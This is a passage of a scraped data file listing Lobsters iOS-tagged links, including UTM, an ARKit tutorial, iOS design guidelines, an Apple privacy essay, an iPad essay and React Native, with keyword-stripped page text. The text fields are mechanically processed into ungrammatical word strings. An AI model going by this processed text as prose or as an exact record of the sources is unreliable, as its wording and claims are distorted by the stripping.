pthreadcreate thread null exceptionhandler void port autoreleasepool return uiapplicationmain argc argv nil nsstringfromclass appdelegate class catch sigkill try avoid sent exiting get one case import appdelegateh implementation appdelegate void applicationwillterminate uiapplication application exit end finally procedure unfit app store use private api requires process gettaskallow entitlement apple grant code signed development certificate apps type submitted app store testflight
79,Lobsters,ios,Apple iOS,"Run Windows, Android, and more in a virtual machine on your iPhone and iPad",https://github.com/utmapp/UTM,run window android virtual machine iphone ipad,utm http getutmapp feature install http getutmappinstall building easy github action advanced signing signing release release io app signer signing development build github action nt appstore license,utm possible invent single machine used compute computable sequence alan turing utm full featured virtual machine host io short allows run window android iphone ipad information http getutmapp feature processor supported including riscv thanks qemu backend fast native graphic paravirtualization thanks spice jit based acceleration using qemu tcg frontend designed scratch using latest greatest apis create manage run vms directly device jailbreak required install want use utm right place visit http getutmappinstall direction building make sure cloned submodules git submodule update init recursive easy recommended way obtain dependency use built artifact github action look latest release build download sysroot artifact either build io build io simulator unzip artifact root directory utm open utmxcodeproj select signing certificate run utm xcode advanced want build dependency highly recommended start fresh macos vm dependency attempt use usrlocallib even though architecture match certain installed library like libusb gawk break build install xcode command line following build prerequisite brew install bison pkgconfig gettext glib libgpgerror nasm make sure add bison path environment git submodule update init recursive nt already run scriptsbuilddependenciessh start build building simulator run scriptsbuilddependenciessh instead open utmxcodeproj select signing certificate build deploy xcode signing build xcode signing done automatically io supported due signing bug use version lower higher signing release ipa release fakesigned jailbroken sign install directly filza want sign release stock device variety way recommended way io app signer note known issue many cloud signing service appcake work utm get crash trying launch vm signing certificate invalid technical detail two kind signing certificate development distribution utm requires development gettaskallow entitlement signing development build want sign xcarchive github action built artifact use following command scriptsresignsh utmxcarchive outputpath profilename teamid profilename name provisioning profile teamid identifier next team name provisioning profile make sure signing key imported keychain provision profile installed io device jailbroken device also fakesign ldid installed scriptsresignsh utmxcarchive outputpath nt appstore apple permit apps interpreted generated code therefore unlikely utm ever allowed however various way people internet come sideload apps without requiring jailbreak condone support method license utm distributed permissive apache license however us several l gpl component dynamically linked gstreamer plugins statically linked part code taken qemu please aware intend redistributing application
80,Lobsters,ios,Apple iOS,The iOS Developer Community Survey [2019],https://iosdevsurvey.com/2019/,io developer community survey,,
81,Lobsters,ios,Apple iOS,Build a simple ARKit app in Swift,https://cybernetist.com/2020/02/17/swift-arkit-sun-app-for-londoners/,build simple arkit app swift,deficiency storm ciara storm dennis david attenborough arkit swift github swift swift swift getting started go rust github basic language guide tutorial xcode storyboard view controller article swiftui swiftui web component arlondonsun arkit app londoner arkit note apple developer official doc delegate protocol delegation protocol official documentation configure start ar session vertical vertical tap sun optional chaining gravity alignment sun note notice conclusion github,happen one lucky people living london miss bit sunlight crisis recently instead usual vitamin deficiency used brought attention regular health check thing little bit worse first got visit storm ciara shortly followed storm dennis sunlight get watching david attenborough documentary netflix guessed build arkit app swift let put fiery sphere room get sunlight whenever need wherever tap screen go find full implementation app github blog post describes foray world io app development past week spent bit time learning swift io reading tutorial watching youtube video would help understand core principle though built apps whilst learning io development decided write blog post particular one believe future headed towards arvr based topic find super interesting exciting besides sharing excitement first somewhat ever working arkit app friend asked hard get started arkit io development general hopefully blog post shed light process went let get started swift want start building io apps need learn bit swift ok maybe little bit bit getting started probably best resource get started swift give taste language feature tooling experience programming go orand rust think able pick basic pretty quickly fortunately bit christopher columbus programming language go github find bunch od random mostly useless project various programming language python r elixir etc surprisingly easy pick basic would dare say fluent swift reading getting started guide hacked simple commandline tool get bit feeling language figured ok readyish start hacking io thing oh wrong swift one programming language still quite make mind know defining feature besides primary language developing io apps language pretty much feature find language top hacking swift feel like creator go rust c met cooking show like britain cooked kind programming language goulash got class inheritance etc immutable structs protocol also inherit property readonly write wrapper etc name interesting though read feature somehow language started growing got checked yet switching different language missed swift feature language documentation pretty good contains load example make understanding language feature quite clear come think may read article official language guide past week also watched bunch video always ended going back guide could copypaste example code editor modify see thing work probably better way learn swift skimmed tutorial example seemed pretty good xcode think beast ide xcode actually need introduction besides saying need learn get around effectively substitute experience afraid first step probably feel bit frustrating beginner one know get past early period left frustration xcode slow halfbroken occasionally even crashing middle editing important part code storyboard session ok generally recover work middle ide crash experienced catastrophic crash could recover data yet storyboard storyboard define user interface app generally dragging dropping widget main view controller modifying attribute attribute inspector thing get pretty complicated want layout responsive different position device might want read autolayout best resource found article good primer get started swiftui alternatively choose build ui app using swiftui introduced recently wwdc building something simple probably better option truly simplify building uis time writing blog post swiftui incomplete slightly buggy provide full feature set access using storyboard see apple going playing felt like building web component point sure get much easier transpile html component swiftui andor share swiftui component across project moment think quite ala opinion come amateur io hacker swift guru might disagree much could go talk going stop say important thing learning something new perseverance experience learning something new need constantly create thing see tangible result activity hate reading death equally come across something understand know much never shy away diving deep documentation stackoverflow making thing ideally thing find interesting best way learn without ado let get started building arkit app decided call arlondonsun arlondonsun arkit app londoner arlondonsun app allows user place sun object ar scene simply tapping device screen order use arkit first time built anything arkit go easy say might incorrect please leave comment spot anything wrong get started creating xcode project creating new io app project xcode prompt choose kind project would building pick augmented reality app offered option fill various project property make sure choose swift scene kit option shown note since run ar apps simulator arkit need access camera test app directly phone might need create apple developer account set xcode accordingly xcode let build app even without real device run without one unfortunately xcode generate swift source code file generic storyboard contain arkit scene kit view get started well ar scene asset newly created project model ship texture play around model dragging around get feel rendering pretty cool project using abovedecribed default asset go ahead select file explorer xcode delete pressing backspace add ar scene asset project later default asset deleted remove following two line viewcontrollerswift file let move create new scene let scene scnscene named artscnassetsshipscn set scene view sceneviewscene scene open viewcontrollerswift file notice xcode automatically imported arkit scenekit module u created project read scenekit official doc basically provides api let compose scene game ar apps using higherlevel component called scene node scene actually graph hierarchy object composed scenekit let define customize scene node render scene efficiently without knowing much lowlevel detail rendering removing two line code mentioned usually enable default lighting add bit light scene case bit dark also place feature point small yellow dot screen development phase see ar session realtime viewdidload look follows override func viewdidload superviewdidload selfsceneviewdebugoptions arscndebugoptionsshowfeaturepoints set view delegate sceneviewdelegate self show statistic fps timing information sceneviewshowsstatistics true automatically add light scene sceneviewautoenablesdefaultlighting true quick explanation viewdidload method viewcontroller class called automatically soon app successfully loaded io good place init important property case enable displaying feature point also enable displaying stats framerate whatnot could remove let keep another thing usually set various delegate talk delegate bit protocol delegation delegation swift design pattern allows type hand control responsibility property method another type without implementing responsibility ie class implementation call method access property delegate instead providing functionality similar experience go pas interface type constructor function io component seem provide lot default method triggered automatically without even knowing apparently change default behavior providing custom implementation case basically take control arscnview delegate method assigning self sceneviewdelegate property nittygritty detail actually bit nuanced full explanation involves something called protocol protocol incredibly powerful language construct akin may experienced go interface type ala protocol swift bit powerful also mean shoot foot easily well want bother feel free check official documentation notice viewcontroller class conforms arscnviewdelegate protocol class inherited protocol conformed mean want override default behaviour method indeed project totally open documentation see protocol requires implementation different variation renderer method simple app provide read somewhere devs render grid plane surface better see surface detected configure start ar session two important method xcode generated u ideal configure start ar session called automatically view appears camera name pretty selfexplanatory viewwillappear viewwilldisappear method pretty selfexplanatory name viewwillappear configures ar world tracking start ar scene session viewwilldisappear pause session app go background want gpu expensive operation keep running better stop ar session happens slightly modify viewwillappear method enable vertical planedetection want achieve obvious later essence want arkit tracking detect vertical surface front phone hold gravity orientation help u place sun scene get position tap sun let get meat problem want tap screen want place sun ar scene node described earlier image captured device camera order need implement actually override touchesbegan method called new touch detected view window place sun scene method pretty simple first pick first touch result find location coordinate system view device screen use location find position node real world captured camera image hittest method use find location real world work way sort space front u find another object surface return detected objectssurface coordinate back u let touch touchesfirst note location screen need convert let touchlocation touchlocation sceneview find location int real world ar scene let result sceneviewhittest touchlocation type existingplaneusingextent pick first available result receive result sun already created stop spin talk spinning later spinning spin spinning yet sun placed scene yet first create place detected location sceneview pick first result unwrap let hitresult resultsfirst let node sun sun spinning stop otherwise start spinning nodespinning nodestop nodespin else create new sun sun sun radius add sun scene place node sun location hitresult may noticed lot let expression code swift call optional binding read optionals swift optionals similar option variant feature miss go lot optional binding let prevent using object nil attempting use optionals swift actually powerful also allow optional chaining let call function access property object nil place method placing sun onto scene need bit explanation might seem bit tricky first sight first retrieve z axis coordinate detected location shift size solar radius look coordinate system gravity alignment see z axis perpendicular device screen place sun half sphere hidden behind whatever surface detect first sceneviewhittest shift sun closer u increasing z coordinate size sun radius set node position place scene nodeposition x z nodeboundingsphereradius ad node scene sceneviewscenerootnodeaddchildnode node let look sun class allows u create sun spin stop sun designated sun initializer creates sun object place onto scene create sphere given radius wrap texture read image sun surface downloaded way wrap sun sphere setting material downloaded texture file notice reference file via relative path ar scene asset let sphere scnsphere radius radius let material scnmaterial materialdiffusecontents uiimage named artscnassetssunjpg spherematerials material note must drag drop sun texture image ar asset project asset spinning order get sun spinning need create animation via scnaction object case want rotation picked random rotation around x z axis notice set duration timeout rotation stop actually want sun keep spinning forever wrap rotation action repeatforever action done set go note create animation note multiplying rotation rotate time simple let spinaction scnactionrotateby x cgfloat randomx z cgfloat randomz duration repeate action forever stopped let repeataction scnactionrepeatforever spinaction start action runaction repeataction want stop spin simply remove action applied sun scene node done ready run app notice need iphone support arkit check programmatically checking following boolean flag arworldtrackingconfigurationissupported conclusion implementing first arkit app lot fun also fair amount frustration hello xcode swift importantly huge learning experience go ahead enjoy sunlight rainy day find full implementation app github
82,Lobsters,ios,Apple iOS,"iOS 13 Design Guidelines, Templates, and Downloads",https://learnui.design/blog/ios-design-guidelines-templates.html,io design guideline template downloads,io convention device screen size page layout typography navigation ui element app icon io convention downloads reading resource iphone screen size link artboard size explanation point v pixel export scaling size artboard use iphone design pt pt reverse true io point v pixel iphone page layout downloads section iphone sketch template io status bar accessible color generator want use white text background blur io nav bar comprised three iphone ui sketch template compactly display page action default io app page layout search third row reappear user scroll back top io tab bar primary destination app selected icon fill color label default font background translucent background blur nav bar modal picker screen io home indicator app switcher screen home screen navigation io apps primary app destination tab bar navigating back action swipe right modal view swipe modal modal io search learn ux design io modal sheet ui element control io list aka left text righthand side rightpointing chevron text chevron checkmark switch text button input control io button nav bar input control io io text box io switch io date andor time picker recommend io picker screen back typography io apps many design system style size uppercase io style title text styling iphone apps scrolled yet scrolled default text styling iphone apps secondary text styling iphone apps tertiary text caption styling iphone apps minimum text size iphone apps io app icon dozen variation icon io superellipse aka icon shape create apple icon superellipsesquircle sketch create apple icon superellipsesquircle figma io convention io tap target size pt dark mode io design guideline text color inverted typography text contrast background color shifted theme color translated pop dark color adjustment io system color learn ui design downloads iphone screen size cheatsheet free download iphone design template free download resource iphone app design human interface guideline io io v android app ui design complete guide io font size guideline ivo io design guideline wrapping one final note learn ui design design newsletter design newsletter,article going cover basically everything need know design iphone app following standard io convention style maybe never designed iphone app idea begin maybe designed dozen still want one place reference best practice heaven know human interface guideline awful try read cover today device screen size page layout typography navigation ui element app icon io convention downloads reading resource iphone screen size first year iphone release screen size pretty manageable design worked screen golden wild west new screen size last year full list reference drag link bookmark get downloadable pdf device artboard size export scaling pro max x max x pro x x x xr x x x se x x x display phone technically artboard size size given device strongly recommend designing artboards size given device explanation point v pixel export scaling much bigger make raster image png jpg exporting take maximum advantage higher resolution device size artboard use iphone design use common iphone screen size audience dense dataheavy screen make sure test smaller screen size recording analytics current app website check common screen size designing app general audience use overall popular iphone screen size pt designing app tech designsavvy audience popular iphone screen size likely newer pt google analytics record audience mobile device go label say set design work well narrower screen almost certainly work well slightly wider screen reverse true always better design narrower screen first doublecheck adjust larger screen since height le constraint matter le whether art board say pixel tall io point v pixel measure designer compare size font ui element across io device tiny square light iphone screen made smaller pixel mean clearer image great merely make pixel smaller everything screen would get smaller balance designer measure size element screen point pixel half tallwide started could use square pixel every point called pixel roughly third tallwide started could use square pixel every point point unit allows u higher resolution screen without element page shrinking yay point said occasionally designer use term interchangeably know context mean boo designer iphone page layout different io apps different layout many standard page layout something like following note downloads section iphone sketch template ruler dividing page area plus status bar home indicator allows start filling framework page quickly interested specific section page skip ahead section io status bar status bar appears top every page except fullscreen image video medium status bar contains time signal wifi battery indicator written text icon either black white background status bar color even transparent find variation color contrast suitably white use accessible color generator using status bar anything except lightest image probably want use white text want minimal status bar variety image use background blur status bar add additional color border needlessly attentionattracting element interface merely blur whatever color making text readable example light gray page background color color frosted glass meaning text black white since iphone x iphones design rounded corner border older iphones ipads shorter compact status bar io nav bar nav bar app display navigation surprise page title primary page action often search think io nav bar comprised three iphone ui sketch template include guide demarcating row typically sit status bar tall first row tall second row tall third row tall measurement always exact io default apps deviate somewhat get started iphone app show one two three row depending need page b scroll state use single row need compactly display page action even page title optional however afford space default io app page layout contains two row one page action second large page title need show search need third row even first row left blank screenshots show prescrolled behavior soon user start scrolling io specifies interesting behavior search bar important see time merely move third row second row app scrolled le important disappear entirely visible user top page io nav bar row disappear upon scrolling reappear user scroll back top note transition state animated totally smoothly small yet characteristic detail io style io tab bar io apps primary destination app listed tab across bottom note thing stylingwise selected icon denoted app theme fill color label text sf default font background eversoslightly translucent background blur effect la nav bar note behavior tab bar button different tab remember state travel certain destination one tab switch another tab switch back first tab left tab tab tap active tab return tab tab bar always visible within app except keyboard shown modal open critical task user focus task hand rather navigate part app tab total need display fifth icon catchall show destination quasipicker screen tapped io home indicator new iphones x recent home indicator thin rounded bar omnipresent bottom screen well omnipresent except already home screen black light screen made white darker screen dragging amount navigate apps home screen drag short way go app switcher screen drag long way go home screen usually home indicator tall fixed element shown scrollable list shown scrolling home indicator even select item directly home indicator tapping home indicator responds swiping navigation io apps primary app destination navigating main area app covered tab bar section navigating back io navigate backwards different way depending context method navigating back context work tap action topleft screen screen action appears swipe right left edge screen screen action appears tap action top screen modal view swipe screen content modal fullscreen eg photo medium view top way usually apply screen screen navigate back topleft action swiping right left edge see modal section navigate away io search primary entry point search phone apps search bar nav bar search icon nav bar search icon tab bar however matter search entry point search experience look fairly similar optionally show popular recent search search box cover best practice search experience course designing intuitive easytouse apps learn ux design io modal sheet task involve single screen linear series screen want user complete without totally leaving context io perfect ui element modal sheet modal sheet normal page slide bottom covering almost previous page b leaf previous page visible yet recessed background modal dismissed pressing action top upperright swiping modal card ui element control io list aka remember mobile design list want get good designing iphone apps learn apple think list say time making list iphone need ask three question text want display also want iconimage go right half cell cover turn text want display list item choose primary text regular primary text regular secondary text regular custom layout eg primary text regular secondary text regular lighter tertiary text regular lighter still left text optionally display icon image finally handful option righthand side list item rightpointing chevron almost default let user know navigating another screen text chevron mean user navigate another screen choose value shown checkmark allows user choose one list item group note multichoice web checkbox list switch allows user toggle property list item refers text button use system color link another page flow use red text represent turning something deleting removing etc io paradigm list covered overview common way using list check input control io button usually think button colored rectangle centered text iphone apps certainly use kind coming world web design might surprised realize many button io simply either icon b colored text either nav bar top screen b action bar bottom screen however io onpage button well pagewide action appear fixed menu nav bar action bar many onpage button apply certain part page hence appear card input control io one nonobvious thing io apps input control almost styled list item io text box text input appear like list item hint disappears typing io switch switch appear within list item label left binary choice switch right io date andor time picker first appears like list item label left value right tap list item expands special control modify pick time b date c time date custom value said recommend using universal replacement dropdowns instead mobile often want use pattern great leadin io picker screen ever tempted use dropdown pretend probably using picker screen pattern iphone apps whole idea something resembling list item actually lead another page pick value ingredient single list item label value chevron lead page many option list one selected show state checkmark made selection navigate back swipe pressing button upperleft typography io apps io typography particular font size see full article io distinctive paradigm styling text perhaps surprising lesson many design system style size uppercase io style weight color unpack lesson looking many text style across iphone apps quick reference case want skip ahead element type style page title unscrolled bold page title scrolled medium paragraph text list item title link normal secondary text normal tertiary text caption normal button text input control normal various color action bar label regular title text styling iphone apps page title written two distinct way iphone apps user scrolled yet scrolled scrolled back top size font weight bold color dark mode color fff alignment left user scrolled size font weight medium color dark mode color fff alignment center default text styling iphone apps text iphone apps size font weight normal color dark mode color fff get lot mileage making slight tweak basic style instance normal list item written default text style mail app show email sender bold help name stand subject line preview likewise textbased link button basically default text different color search field hint text default text lighter gray secondary text styling iphone apps iphone apps standardized style supporting text size font weight normal color dark mode color tertiary text caption styling iphone apps explanatory given even smaller lighter treatment secondary text size font weight normal color dark mode color minimum text size iphone apps design system save lot headache define minimum size iphone apps action bar label size font weight normal color unselected dark mode color unselected io app icon design app icon specifically size appears every possible location every possible iphone ipad end needing create dozen variation icon welcome use sketch rather simply template file new template io app icon however like rather make sure common size common newer device covered call whole point business individual pixel small see iphone app icon design plan create square icon look good verify look good masked apple superelljpse blow optionally adjust pixelperfect like blow optionally adjust pixelperfect like blow export size pngs done io superellipse aka icon shape even though always export icon square apple cut corner using type shape called superellipse superellipse squircle look lot like normal rounded rectangle fact difference basically invisible naked eye rationale swtich superellipse gently transition straight part curved part leading overall organic shape b aligns better corner hardware device really matter icon border case border shape determined superellipse rounded rectangle create superellipsesquircle sketch figma create apple icon superellipsesquircle sketch create square using insert menu shortcut change corner radius length one size multiplied change round corner smooth corner create apple icon superellipsesquircle figma create square using rectangle menu item shortcut change corner radius length one size multiplied open independent corner menu right corner radius setting open corner smoothing menu icon set indicator located io convention couple thing probably know designing iphone app go ahead list io tap target size everything user able tap every button every slider every input control least pt size exception really excusable break text link paragraph text line text likely quite bit shorter mean link tap target le size b link position two consecutive line text pretty difficult user tap accurately always avoided worth knowing something minimize even apple keep strenuously tap target guideline though suggest anyways dark mode io design guideline io io oslevel setting participating apps generally dark background light text instead light background dark text io automatically transition dark version using native control color understand general principle dark mode custom ui simple guideline text color inverted bit oversimplification black text becomes white dark gray text becomes light gray text middle gray text stay basically look typography style notice io actually drop extra shade simplifies text color dark theme tell whether make middlebrightness gray darker lighter go option higher contrast text contrast background background color shifted unlike text darker color become lighter background color shifted darker background color lighter light mode still lighter dark mode light come sky understand understand relying background color depth cue unlike text work totally different way theme color translated pop dark accent color previously using light background need pop similarly dark background since white brightness black brightness often mean lowering brightness bright color greater theory color adjustment raising saturation color taken io system color creating dark ui topic deserving guide one thing cover lot depth learn ui design downloads created resource easy reference link description iphone screen size cheatsheet pixel point inch oh quick guide screen size resolution free download iphone design template sketch file also open figma includes iphone artboard ruler make common section screen b mask notch rounded corner c easytorecolor status bar downloaded open sketch choose file save template easy access free download resource iphone app design human interface guideline io standard notoriously difficult read first wade abstract principle constantly face uphill battle hackneyed terminology list called filed apparently plain text look anyhow say adjust mindset apple coolaid make lot sense face designing iphone app going anyways best get used io v android app ui design complete guide ok say think going making android version iphone app point best start thinking design difference know may end stealing great idea android design principle article actually cover io design paradigm get worth read io font size guideline one unexpected part getting good ui design developing intuitive sense font size use help wrote comprehensive guide font size one part one io apps gotten far probably read ivo io design guideline comprehensive guide could find besides one making humanreadable iphone app guideline besides one fantastic read wrapping miss anything something look wrong give shout email protected continually updating guide accurate humanreadable guide web creating iphone apps one final note first time might also interested learn ui design fulllength online video course user interface design design newsletter person newsletter original design article aimed giving tactical advice improve uxui skill people really nice stuff say newsletter praise design newsletter thank newsletter possibly best newsletter received since started freelancing tricia littlefieldfounder thesimpleweb time receive email like long email way read began read like freaking read jeanphilippeux strategist freelance design newsletter subscribedno spam unsubscribe anytime
83,Lobsters,ios,Apple iOS,One very bad Apple,https://vicki.substack.com/p/one-very-bad-apple,one bad apple,art apple gatherer camille pissaro billy lynn long halftime walk bug get closed window started process early since apple closed apple fbi want unlock phone tim apple released statement apple imessage apple thirdparty commentator tim said privacy czar differential privac pinboard haunted data website obesity crisis build better monster best reporting protest working political campaign journalist securing device doubt wrote paper matthew green listening siri turned siri still opt ad tracking thirdparty apps collecting stuff touted recent ad part icloud leak data apple encrypting icloud backup request fbi florida able backdoor anyway apple crosshatch big presence china chinese government asks look ad increased exponentially people diagram remember complicated ring immense competition effectively stimulate customer demand growing concern consumer gdpr ccpa bruce schneier every phone like youtube lawyer put phone fridge russia recently mandated limited ad tracking reading lately elon musk soundcloud newsletter swag sticker mug notepad author writing bad tweet twitter,art apple gatherer camille pissaro fifth grade teacher mr stain big energy imparted two american cultural norm upon first taught religion american football also interested learning recommend billy lynn long halftime walk second taught bumper sticker loved collecting bunch tacked bulletin board one favorite paranoid mean get phrase lately turned funny school memory jaded way viewing world stacked endconsumer probably joseph heller intended originally wrote bug get closed windowsrecently thinking phrase context apple commitment privacy apple always made marketing pitch secure platform started steve job famously obsessive complete control every aspect hardware software apple started process early onby late apple released io system company encrypting default thirdparty data stored customer phonessince apple closed harder hacker get security also mean apple reverseengineer code see underlying message apple fbithis theory put horrific stress test two shooter killed people injured san bernardino california shooter killed shootout police recovered three phone crime scene one shooter work phone still intact locked numeric passcode aftermath shooting declared act terrorism result federal government wanted get involved fbi asked apple unlock phone apple want unlock phone iphone locked fourdigit passcode fbi unable crack fbi wanted apple create special version io would accept unlimited combination password electronically right one found new io could sideloaded onto iphone leaving data intactbut apple refused cook team convinced new unlocked version io would dangerous thinking issue small group morning tim apple released statement talked vital need encryption threat data security fbi request resulted specifically fbi want u make new version iphone operating system circumventing several important security feature install iphone recovered investigation wrong hand software exist today would potential unlock iphone someone physical possession fbi may use different word describe tool make mistake building version io bypass security way would undeniably create backdoor government may argue use would limited case way guarantee controlthe apple imessagethis perhaps first time heard large company ceo talking privacy actually putting money mouth super impressed year switched iphone everything read became reassured apple thirdparty commentator apple interest anything except user privacy need sell data tim said truth could make ton money monetized customer customer product cook said elected privacy u human right civil liberty something unique america like freedom speech freedom press cook said privacy right usand believe tim privacy czarsindeed collection apple customer data requires signoff committee three privacy czar top executive according four former employee worked variety product went privacy vettingapproval anything automatic product including siri voicecommand feature recently scaledback iad advertising network restricted privacy concern people saidand believe tim privacy czar apple machine learning team started talking publicly differential privacy working differential privacy practice adding enough fake data noise given machine learning algorithm longer tie back data individual still allows ml prediction work combined federated privacy machine learning model trained run directly mobile device without directly connecting apple server differential privacy result really good strong privacy differential privacy provides mathematically rigorous definition privacy one strongest guarantee privacy available rooted idea carefully calibrated noise mask user data many people submit data noise added average meaningful information emergesbut trusting company one thing trusting independent person trust another maciej ceg≈Çowski said trusted apple maciej run pinboard written essay linked many time giving royalty favorite include haunted data website obesity crisis build better monster saw deliver live philly right hong kong best reporting protest spite fact journalist macjiei started working political campaign journalist securing device since advocated many time people use iphones tim developer data scientist journalist maciej telling use apple phone going use apple phone doubtsand thing great year paranoia started creeping infirst cryptographer really happy way imessages encrypted wrote paper way could exploit imessage paper conduct thorough analysis imessage determine security protocol variety attack analysis show imessage significant vulnerability exploited sophisticated attacker practical implication attack party gain access imessage ciphertexts may potentially decrypt remotely fact researcher including matthew green went say main recommendation apple replace entirety imessage messaging system properly designed formally verified sound serious cryptography expert let one slide report apple contractor listening siriaccording contractor siri interaction sent worker listen recording asked grade variety factor like whether request intentional false positive accidentally triggered siri response helpful never ever turned siri report said apple anonymized command let slide story still opt ad tracking iphone thirdparty apps collecting stuff youyou might assume count apple sweat privacy detail touted recent ad happens iphone stay iphone investigation suggests otherwiseiphone apps discovered tracking passing information third party asleep include microsoft onedrive intuit mint nike spotify washington post ibm weather channel one app crimealert service citizen shared personally identifiable information violation published privacy policythen report apple running part icloud aws move fraught security consideration implication least apple trusting significant part infrastructure competitor paper put google still apple intelligent tracking protection safari leak data last straw january revealed apple encrypting icloud backup request fbi apple facing pressure fbi asking hand phone related another shooting happened january florida finally whatever happened iphone tim apple valiantly fought fbi government able backdoor anyway without apple help apple theory mad apple playing big game crosshatch time giving unencrypted data government big presence china chinese government asks allowing targeted advertising enormous proprivacy advertising campaign look look ad put ce la vega year trade show even attended vendor year upall look workhorse model normcorian analysis apple history form system theory first think important differentiate two thing privacy apple system icloud imessage phone thirdparty app ecosystem company also relies first entirely apple responsibility apple started jobsian premise closed closed mean control every aspect corporate structure basically product decision coming high tim cook took small sleek system steve tight grip exploded size example apple employee number increased exponentially since make thing hard manage people working new iphone camera alone imagine many moving piece add imessage add browser look diagram show many service involved audio part phone remember complicated ring multiply million many people working io ecosystem anywhere upwards based super loose google search phone o also grown exponentially complicated service apple offering also lot diverse hardware anymore also software streaming service peripheral like watch however apple facing immense competition market company product service highly competitive company confronted aggressive competition area business mean company move quickly differentiate already gotten planned obsolescence science current phone owner company must continually introduce new product service technology enhance existing product service effectively stimulate customer demand new upgraded product servicesso lure new phone owner better way play privacy angle something growing concern consumer gdpr ccpa era privacy competitive advantagegiven impossible monitor every single security threat apple goof privacy thing assume half intentional half group project manager simply oversee way privacy setting go wrong phone connected internetas bruce schneier said security really hard even going possible attack vector arise phone actively connects internet including gps tracking affect every phonesecond app store launched apps million could tracking user data number given way apple tread fine line lock everything phone level apps would get angry leave platform people get angry like youtube apple tread fine line permissive enough cancelled truth matter modern cell phone like datarich leaky sieve constantly giving information number way number party without incentive company reign edward snowden lawyer put phone fridge speaking nsa apple finally gotten big many governmental agency listening making demand get access phone fbi china apple already made ton concession apple russia problem russia recently mandated cell phone preload software tell russian government november russian parliament passed become known law apple legislation require smartphone device preload host application may provide russian government glut information citizen including location finance private communicationsso apple bit pickle becoming big prioritizing security time need advertise privacy key differentiator consumer taste change time get canclled fbi china russiaand thinking thing royally screwing consumer came search respite tracked consumer well one particular limited ad tracking stopped icloud backup message resumed allencompassing paranoiawhat reading lately python byte week big true elon musk soundcloudthe newsletter newsletter different angle tech news go week free subscriber paid subscriber like forward swag sticker mug notepad author data scientist free time spent wrangling preschooler baby reading writing bad tweet find follow twitter
84,Lobsters,ios,Apple iOS,The iPad Awkwardly Turns 10,https://daringfireball.net/2020/01/the_ipad_awkwardly_turns_10,ipad awkwardly turn,ipad awkwardly turn steve job introduced ipad stage yerba buena theater san francisco slide,ipad awkwardly turn monday january ten year ago today steve job introduced ipad stage yerba buena theater san francisco surprised everyone several way expected touchscreen mac stylus expected product would news industry ipod done music industry decade prior expected starting price ipad none thing also job final big new product announcement big iphone common initial criticism turn big iphone fantastic idea new product music ten million iphone user ear job onstage pitch exactly right ipad new class device sitting phone laptop succeed needed better thing either phone laptop needed much better ten year later though think ipad come close living potential time mac turned redefined multiple industry almost graphic designer illustrator using computer work almost graphic designer illustrator using computer work mac revolution iphone revolution ipad spectacular success ten million beloved part daily life date fallen short revolutionary ipad hardware undeniably great lowerpriced model excellent consumer tablet cheapest personal computer apple ever made remain perfectly useful many year ipads pro outperform macbooks computationally thin light reliable gorgeous yet despite impressive computational performance need fan software ipad gotten lost ipados multitasking model far capable iphone yes somehow apple painted corner far le consistent coherent mac also far le capable ipad multitasking complex le powerful quite combination consider basic task putting two apps screen time basic definition multitasking ui sense launch first app tap icon homescreen like iphone like ipad splitscreen multitasking tapping icon open app natural intuitive get second app screen tap icon must first slide bottom screen reveal dock must tap hold app icon dock drag app icon dock launch way become second app splitting display dragging icon dock way remove apps dock yes homescreen way launch app dock splitscreen mode identical way remove app dock oh apps dock become second app split screen mode sense limitation make iphone one app screen time screen app app screen limiting trivial understand mac many apps screen time want launch second third twentieth app exactly way launch first consistency ipad two apps screen time must launch entirely different way one intuitive tap app icon one inscrutable drag one handful apps placed dock quite drag app dock far enough side screen launch slide entirely different sharedscreen rather splitscreen mode whole concept merely inconsistent incoherent would anyone ever figure splitscreen multitask ipad already know iphone always launch apps way tapping icon mac slightly complex context dock launchpad spotlight result launch apps singleclicking finder however must doubleclick method seeming madness must doubleclick open something mac context singleclicking merely select item mac click doubleclick issue confused untold million nonexpert user decade many people seen doubleclick link web browser iphone simplicity eliminated sort confusion one needlessly doubletaps tappable item iphone ipad originally shared simplicity clarity ipad debuted top bottom easier understand mac could learn everything learn tapping sliding explore impossible get lost confused thing stand today get phone call mom month accidentally gotten safari splitscreen mode tapping link mail message get like ipad much use almost every day could go back presplitscreen predraganddrop interface would say ipados name wish could install iphone oneapponscreenatatime nodraganddrop io ipad pro heartbeat much happier ipad grave disappointment bad bad great even great though many way overall fallen far short grand potential showed day one reach potential apple need recognize made profound conceptual mistake ipad user interface mistake need scrapped replaced polished refined worry ipados suggests opposite apple steering ipad full speed ahead blind alley
86,Lobsters,ios,Apple iOS,A framework for building native apps with React,https://github.com/facebook/react-native,framework building native apps react,learn write anywhere react declarative componentbased developer velocity portability platform ecosystem overview content requirement expo building first react native app getting started guide documentation website react documentation facebookreactnativewebsite upgrading upgrading guide reactnativecommunityreactnativereleases contribute full text contributing guide roadmap good first issue good first issue discussion reactnativecommunitydiscussionsandproposals license license licensedocs,learn write anywhere build mobile apps react react native brings react declarative ui framework io android react native use native ui control full access native platform declarative react make painless create interactive uis declarative view make code predictable easier debug componentbased build encapsulated component manage state compose make complex uis developer velocity see local change second change javascript code live reloaded without rebuilding native app portability reuse code across io android platform react native developed supported many company individual core contributor find ecosystem overview content requirement react native apps may target io android api newer may use window macos linux development operating system though building running io apps limited macos tool like expo used work around building first react native app follow getting started guide recommended way install react native depends project find short guide common scenario documentation full documentation react native found website react native documentation discus component apis topic specific react native documentation react api shared react native react dom refer react documentation source react native documentation website hosted separate repo facebookreactnativewebsite upgrading upgrading new version react native may give access apis view developer tool goody see upgrading guide instruction react native release discussed react native community reactnativecommunityreactnativereleases contribute main purpose repository continue evolving react native core want make contributing project easy transparent possible grateful community contributing bug fix improvement read learn take part improving react native facebook adopted code conduct expect project participant adhere please read full text understand action tolerated read contributing guide learn development process propose bugfixes improvement build test change react native learn vision react native roadmap good first issue list good first issue contain bug relatively limited scope great place get started gain experience get familiar contribution process discussion larger discussion proposal discussed reactnativecommunitydiscussionsandproposals license react native mit licensed found license file react native documentation creative common licensed found licensedocs file
